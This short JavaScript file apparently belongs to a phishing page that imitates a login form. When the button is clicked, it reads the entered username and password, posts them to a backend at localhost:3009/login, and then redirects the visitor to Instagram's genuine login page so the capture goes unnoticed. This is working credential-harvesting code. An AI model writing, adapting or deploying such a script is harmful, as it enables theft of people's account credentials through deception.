let button = document.querySelector(".btn")
let username = document.querySelector('#username')
let password = document.querySelector('#password')
let toBack
// console.log(button)
console.log("Another")

button.addEventListener("click", grabInput)
// x.addEventListener("onClick", grabInput)

function grabInput(e){
    e.preventDefault()
    const myUsername = username.value
    const myPassword = password.value
    toBack = {email:myUsername, password:myPassword}
    // console.log(toBack)
    sendData()
}

async function sendData() {
    const res = await fetch('http://localhost:3009/login', {
        method:"POST",
        body:JSON.stringify(toBack),
        headers:{"Content-type":"application/json"}
    })
    const data = await res.json()
    console.log(data)
    location.href="https://www.instagram.com/accounts/login/"
}